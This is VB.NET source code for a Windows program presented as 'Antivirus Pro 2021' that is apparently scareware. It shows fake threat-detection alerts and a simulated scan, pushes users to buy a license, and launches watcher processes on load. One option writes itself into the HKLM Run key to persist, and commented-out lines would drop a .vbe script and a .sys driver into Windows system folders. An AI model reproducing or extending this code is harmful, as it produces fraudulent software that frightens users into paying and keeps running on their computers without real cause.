Imports System.IO
Public Class Form1
#Disable Warning
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' File.WriteAllText("C:\Windows\system.vbe", My.Resources.system)
        ' File.WriteAllText("C:\Windows\system32\drivers\bcelit.sys", My.Resources.bcelit)
        Process.Start("avwatcher.exe")
        If ProgressBar1.Value = 3000 Then
            Button1.Enabled = True
        End If
        Process.Start("watcher32.exe")
        If Label19.Text = "Admin" Then
            Button1.Enabled = True
        End If
    End Sub



    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged

    End Sub

    Private Sub ProgressBar1_Click(sender As Object, e As EventArgs) Handles ProgressBar1.Click

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ProgressBar1.Increment(1)
        If Me.ProgressBar1.Value = 214 Then
            Me.Label4.Text = "1"
            GunaGradientPanel1.GradientColor1 = System.Drawing.Color.DarkRed
            GunaGradientPanel1.GradientColor2 = System.Drawing.Color.Red
            GunaGradientPanel1.GradientColor3 = System.Drawing.Color.DarkRed
            GunaGradientPanel1.GradientColor4 = System.Drawing.Color.Red

        End If
        If Me.ProgressBar1.Value = 10 Then
            Me.Label1.Visible = True

        End If
        If Me.ProgressBar1.Value = 214 Then
            CheckBox1.Show()
        End If

        If Me.ProgressBar1.Value = 338 Then
            CheckBox2.Show()
            Label4.Text = "2"
        End If

        If Me.ProgressBar1.Value = 510 Then
            CheckBox3.Show()
            Label4.Text = "3"
        End If
        If Me.ProgressBar1.Value = 1246 Then
            CheckBox4.Show()
            Label4.Text = "4"
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick

    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Me.NotifyIcon2.ShowBalloonTip(7500, "Threat detected", "Antivirus found 4 threats on your computer. Remove it now!", ToolTipIcon.[Error])
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        MsgBox("Actions successfully started.")
        If ProgressBar1.Value = 3000 Then
            Me.Enabled = True
        End If
        CheckBox1.Visible = False
        CheckBox2.Visible = False
        CheckBox3.Visible = False
        CheckBox4.Visible = False

    End Sub



    Private Sub CheckBox4_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox4.CheckedChanged

    End Sub

    Private Sub CheckedListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles CheckedListBox1.SelectedIndexChanged

    End Sub

    Private Sub GunaSeparator1_Click(sender As Object, e As EventArgs) Handles GunaSeparator1.Click

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Interaction.MsgBox("License key is invalid! Please check again or buy it!")
    End Sub

    Private Sub TextBox5_TextChanged(sender As Object, e As EventArgs) Handles TextBox5.TextChanged
        If TextBox5.Text = "admin" Then
            Interaction.MsgBox("You've successfully activated Antivirus Pro 2021! Thank you for choosing our product!")
            Label20.ForeColor = System.Drawing.Color.LimeGreen
            Label20.Text = "Activated"
            Label19.Text = "Admin"
        End If
    End Sub

    Private Sub PictureBox7_Click(sender As Object, e As EventArgs) Handles PictureBox7.Click

    End Sub

    Private Sub GunaGradientButton1_Click(sender As Object, e As EventArgs) Handles GunaGradientButton1.Click
        Timer1.Start()
        Timer2.Start()
    End Sub

    Private Sub TabPage2_Click(sender As Object, e As EventArgs) Handles TabPage2.Click

    End Sub

    Private Sub CheckBox14_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox14.CheckedChanged
        My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
    End Sub

    Private Sub GunaGradientButton2_Click(sender As Object, e As EventArgs) Handles GunaGradientButton2.Click
        Timer1.Stop()
        ProgressBar1.Value = 0
        GunaGradientPanel1.GradientColor1 = System.Drawing.Color.MediumSeaGreen
        GunaGradientPanel1.GradientColor2 = System.Drawing.Color.SteelBlue
        GunaGradientPanel1.GradientColor3 = System.Drawing.Color.MediumSeaGreen
        GunaGradientPanel1.GradientColor4 = System.Drawing.Color.SteelBlue

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Interaction.MsgBox("Done.")
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("https://nquantum.ga/donotopen")
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Dim result As DialogResult = OpenFileDialog1.ShowDialog()
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Interaction.MsgBox("Failed to fetch driver data.")
        OpenFileDialog1.FileName = TextBox6.Text()
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Form2.Show()
    End Sub

    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
        Form3.Show()
    End Sub

    Private Sub LinkLabel2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Process.Start("https://viral-labs.tk")
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Interaction.MsgBox("Done!")
    End Sub
End Class
